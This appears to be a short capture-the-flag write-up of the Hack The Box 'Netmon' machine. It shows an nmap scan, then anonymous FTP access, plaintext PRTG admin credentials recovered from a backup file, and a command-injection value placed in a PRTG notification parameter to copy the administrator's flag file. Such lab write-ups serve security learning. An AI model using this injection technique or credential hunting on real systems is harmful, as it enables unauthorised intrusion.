---
title: "HTB Netmon Quick Writeup"
subtitle: "First Windows Box I Owned"
date: 2019-03-08T13:09:31-04:00
lastmod: 2020-05-29T13:09:31-04:00
draft: false
author: "Nathan Higley"
authorLink: ""
description: ""

tags: [writeup, hackthebox, hacking]
categories: [HackTheBox, Security]

hiddenFromHomePage: false
hiddenFromSearch: false

featuredImage: ""
featuredImagePreview: ""

toc:
  enable: true
math:
  enable: false
lightgallery: false
license: ""
---

# Netmon

### Enumeration

>nmap -A -p- -T4:
 ```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-08 20:55 EST
Nmap scan report for 10.10.10.152
Host is up (0.100s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds


Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-03-08 20:56:22
|_  start_date: 2019-03-08 20:11:33

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   100.19 ms 10.10.12.1
2   100.41 ms 10.10.10.152
```

## Got User
> Just log in to anonymous FTP and find the user.txt file.

## Got Admin Credentials For Web App
> Find plaintext credentials in 'C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak'

>username = prtgadmin

>password = PrTg@dmin2019

 ## Got Admin Hash
 
 Exploit a vulnerability in the PRGT Netmon's powershell sensor, more specifically the default powershell script.  This allows for execution of a powershell script as administrator.   Use the powerline command to copy the root.txt file to a hidden folder that is open to the FTP, and grab the file using FTP.
```
Test.txt;Copy-Item -Path C:\Users\Administrator\root.txt -Destination C:\ProgramData\1.txt -Force 
```
